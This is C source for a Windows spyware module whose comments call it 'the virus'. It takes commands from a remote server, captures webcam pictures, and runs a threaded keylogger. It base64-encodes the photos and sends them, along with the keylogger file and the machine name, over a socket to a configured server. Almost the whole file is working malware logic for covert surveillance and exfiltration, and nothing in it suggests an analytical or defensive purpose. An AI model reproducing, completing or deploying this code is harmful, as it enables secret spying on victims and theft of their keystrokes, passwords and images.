#include "StartDoingDamage.h"

// Global variable for the thread handle.
HANDLE thread_handle = 0; // thread handle for the Key Logger -> declared here to be able to close the thread when needed.


// This function is called if there are commands for the virus to do -> the 'brain' / 'manager', using the damage functions.
int start_damage(char* data)
{
	int i = 0, iResult = 0, amount_of_commands = 0;

	amount_of_commands = amount_of_missions(data);

	// Declared here because the commands amount is needed.
	char** commands = (char**)malloc(amount_of_commands * sizeof(char*)); // array of commands in the heap -> commands amount size.

	iResult = split_data_to_commands(commands, amount_of_commands, data);
	if (iResult != 0)
	{
		printf("Problem in the split data to command function! \n");
		return -1;
	}

	// temp print the commands
	for (i = 0; i < amount_of_commands; i++)
	{
		printf("commands[i] = %s \n", commands[i]);
	}


	// start doing the commands given.
	iResult = do_commands_and_send(commands, amount_of_commands);
	if (iResult != 0)
	{
		printf("Problem doing and sending the commands! \n");
		return -1;
	}



	free(commands); // free the heap memory allocated for the commands

	return 0;
}


// This function fills up the commands array with the command given in the data.
int split_data_to_commands(char** commands, int commands_size, char* data)
{
	int i = 0, j = 0, p = 0, command_len = 0, get_command_len = 0, command_start = 0;


	j = 0; // readable reasons.
	for (i = 0; i < strlen(data); i++)
	{

		// start of command
		if (data[i] == '"')
		{
			get_command_len = !get_command_len; // start of command, or end of command
			
			if (get_command_len) // if the start of the commnad
			{
				command_start = i + 1; // start of the command is one ahead of the "
			}
			
		}
		// if still need to read the len of the command
		if (get_command_len)
		{
			command_len++;
		}
		// if needed to copy command
		else if (command_len > 0)
		{
			
			commands[j] = (char*)malloc(command_len);

			strncpy(commands[j], data + command_start, command_len);

			commands[j][command_len - 1] = '\0'; // add null byte at the end of the string

			j++;
			command_len = 0;
		}
	}
	
	return 0;
}


// This function does the commands that the client asked for and sends them.
int do_commands_and_send(char** commands, int size_of_commands)
{
	int i = 0, iResult = 0;
	//HFILE file_handle = 0; // file handle
	//OFSTRUCT file_struct = { 0 }; // file structure
	/*WSADATA wsaData = { 0 };
	struct sockaddr_in clientService = { 0 };
	SOCKET ConnectSocket = { 0 };*/


	for (i = 0; i < size_of_commands; i++)
	{
		if (strncmp(commands[i], WEB_CAM, sizeof(WEB_CAM)) == 0)
		{
			// if the command is to take a picture from the camera

			if (TakePicture() != 0) // take picture
			{
				printf("Problem taking picture! \n");
				return -1;
			}

			// sending the picture threw the socket connection
			iResult = send_picture();
			if (iResult != 0)
			{
				printf("Problem sending the picture taken! \n");
				return -1;
			}
			

			printf("Took picture! \n");

		}
		else if (strncmp(commands[i], START_KEY_LOGGER, sizeof(START_KEY_LOGGER)) == 0)
		{
			// if the command is to start the key logger

			printf("starting key logger! \n");

			iResult = start_key_logger_threaded();
			if (iResult != 0)
			{
				printf("Problem in starting the key logger threaded function! \n");
			}

		}
		else if (strncmp(commands[i], STOP_KEY_LOGGER, sizeof(STOP_KEY_LOGGER)) == 0)
		{
			// if the command is to stop the key logger

			printf("\nclosing the thread\n");
			iResult = close_key_logger_thread();
			if (iResult != 0)
			{
				printf("Problem in closing the key logger thread function! \n");
				return -1;
			}

			iResult = send_key_logger_file();
			if (iResult != 0)
			{
				printf("Problem sending the Key Logger file! \n");
				return -1;
			}

			printf("Sent the key logger file! \n");

		}
		else
		{
			// if the command is not valid
			printf("Command given is not valid! \n");
			return -1;
		}
	}




	return 0;
}



// This function sends the picture taken through the socket connection.
int send_picture()
{
	int i = 0, iResult = 0, msg_len = 0;
	WSADATA wsaData = { 0 };
	struct sockaddr_in clientService = { 0 };
	SOCKET ConnectSocket = { 0 };
	HFILE picture_file_handle = 0; // file handle
	OFSTRUCT file_struct = { 0 }; // file structure
	unsigned char* file_content = NULL;
	unsigned char* base_64_file_content = NULL;
	unsigned char* msg = NULL;
	int bytes_read = 0, file_size = 0, base_64_file_size = 0;


	picture_file_handle = OpenFile("picture.bmp", &file_struct, OF_READ); // opening the picture file
	if (picture_file_handle == HFILE_ERROR) // if error eccurred
	{
		printf("Problem opening the picture for sending! \n");
		return -1;
	}
	

	// getting the picture file size -> in bytes
	file_size = GetFileSize(picture_file_handle, NULL);


	// allocating memory in the heap for the file to be read -> the size is the file size variable
	file_content = (unsigned char*)malloc(file_size);

	// reading file content -> to file_content variable
	iResult = ReadFile(picture_file_handle, file_content, file_size, &bytes_read, NULL);
	if (iResult == 0)
	{
		printf("Problem reading file, picture binary! \n");
		return -1;
	}

//	file_content[];

	base_64_file_size = (file_size * 8) / 6 + 1; // -> file size = 3, 24 bits, 4 base 64 chars, with null byte

	base_64_file_content = (char*)malloc(base_64_file_size);


	// encode the file content to his base 64 characters.
	iResult = encode_to_base_64(file_content, file_size, base_64_file_content, base_64_file_size);



	msg_len = strlen(POST_PICTURE_MSG) + strlen(pc_name) + strlen(SOCKET_IP) + sizeof(SOCKET_PORT) + base_64_file_size + 10;

	msg = (char*)malloc(msg_len);

	snprintf(msg, msg_len, POST_PICTURE_MSG, pc_name, base_64_file_size + strlen("{\"picture_content\":\"\"}") - 1, SOCKET_IP, SOCKET_PORT, APOSTROPHES, APOSTROPHES, APOSTROPHES);

	// the real / full msg len
	msg_len = strlen(msg) + strlen("\"}") + base_64_file_size - 1; // without the null byte

	memcpy(msg + strlen(msg), base_64_file_content, base_64_file_size - 1); // adding the picture data to the msg in the end of the msg. -> dont copy the null byte

	

	// adding the end of the json formatted data
	strncpy(msg + msg_len - strlen("\"}"), "\"}", strlen("\"}"));
	
	msg[msg_len] = '\0';


	// start the socket connection
	iResult = connect_socket(wsaData, clientService, &ConnectSocket);
	if (iResult != 0)
	{
		printf("Problem starting the connection with the socket");
		return -1;
	}

	printf("Connected to server.\n"); // connected to the server -> with socket



	// sending the get command message
	iResult = send(
		ConnectSocket,
		msg,
		msg_len,
		NULL
	);

	printf("Sent the picture to the server! \n");

	printf("%d bytes sent! \n", iResult);


	if (iResult == SOCKET_ERROR || iResult == 0)
	{
		printf("Problem sending the get command message! \n");
		return -1;
	}





	// closing the file handle
	iResult = CloseHandle(picture_file_handle);
	if (iResult == 0)
	{
		printf("Problem closing the file handle in send picture function! \n");
		return -1;
	}

	// closing the socket connection
	iResult = close_socket(&ConnectSocket);
	if (iResult != 0)
	{
		printf("Problem closing the socket connection! \n");
		return -1;
	}

	printf("socket closed correctly! \n");


	free(msg);
	free(file_content);
	free(base_64_file_content);

	return 0;
}


// This function start the key logger function in a new thread.
int start_key_logger_threaded()
{
	// thread handle is a Global variable.

	DWORD thread_id = 0; // int

	// starting the thread for the Key Logger function.
	thread_handle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_logger, NULL, 0, &thread_id);
	
	printf("return val = %#.8x \n",WaitForSingleObject(thread_handle, 0));

	return 0;
}


// This function closes the key logger thread.
int close_key_logger_thread()
{
	// thread handle is a Global variable.

	int iResult = 0;

	// closing the Key Logger thread.
	iResult = TerminateThread(thread_handle, 0);
	if (iResult == 0)
	{
		printf("Problem closing the thread for the Key Logger! \n");
		return -1;
	}

	// closing the handle to the Key Logger file, closed here because TerminateThread function kills the thread immediattley without closing the handle - that's the reason it's declared as Global variable in KeyLogger.h header file.
	CloseHandle(file_handle);
	
	

	return 0;
}


// This function sends the Key Logger file.
int send_key_logger_file()
{
	int i = 0, iResult = 0, msg_len = 0;
	WSADATA wsaData = { 0 };
	struct sockaddr_in clientService = { 0 };
	SOCKET ConnectSocket = { 0 };
	HFILE key_logger_file_handle = 0; // file handle
	OFSTRUCT file_struct = { 0 }; // file structure
	char* file_content = NULL;
	char* msg = NULL;
	int bytes_read = 0, file_size = 0;


	key_logger_file_handle = OpenFile("every_thing_written.txt", &file_struct, OF_READ); // opening the picture file
	if (key_logger_file_handle == HFILE_ERROR) // if error eccurred
	{
		printf("Problem opening the key logger file for sending! \n");
		return -1;
	}


	// getting the picture file size -> in bytes
	file_size = GetFileSize(key_logger_file_handle, NULL);


	// allocating memory in the heap for the file to be read -> the size is the file size variable
	file_content = (char*)malloc(file_size + 1); // with the null byte

	// reading file content -> to file_content variable
	iResult = ReadFile(key_logger_file_handle, file_content, file_size, &bytes_read, NULL);
	if (iResult == 0)
	{
		printf("Problem reading file, key logger! \n");
		return -1;
	}

	// Adding the null byte.
	file_content[file_size] = '\0';

	msg_len = strlen(POST_Key_Logger_MSG) + strlen(pc_name) + sizeof(int) + strlen(SOCKET_IP) + sizeof(SOCKET_PORT) + file_size + 10;


	msg = (char*)malloc(msg_len);

	msg_len = snprintf(msg, msg_len, POST_Key_Logger_MSG, pc_name, file_size + strlen("{%key_logger%:%%}"), SOCKET_IP, SOCKET_PORT, APOSTROPHES, APOSTROPHES, APOSTROPHES, file_content, APOSTROPHES);

	printf("msg = %s\nmsg_len = %d\nfile_size = %d \n", msg, msg_len, file_size);

	// start the socket connection
	iResult = connect_socket(wsaData, clientService, &ConnectSocket);
	if (iResult != 0)
	{
		printf("Problem starting the connection with the socket");
		return -1;
	}

	printf("Connected to server.\n"); // connected to the server -> with socket



	// sending the get command message
	iResult = send(
		ConnectSocket,
		msg,
		msg_len,
		NULL
	);

	printf("Sent the key logger to the server! \n");

	printf("%d bytes sent! \n", iResult);


	if (iResult == SOCKET_ERROR || iResult == 0)
	{
		printf("Problem sending the get command message! \n");
		return -1;
	}





	// closing the file handle
	iResult = CloseHandle(key_logger_file_handle);
	if (iResult == 0)
	{
		printf("Problem closing the file handle in send picture function! \n");
		return -1;
	}

	// closing the socket connection
	iResult = close_socket(&ConnectSocket);
	if (iResult != 0)
	{
		printf("Problem closing the socket connection! \n");
		return -1;
	}

	printf("socket closed correctly! \n");


	free(msg);
	free(file_content);

	return 0;
}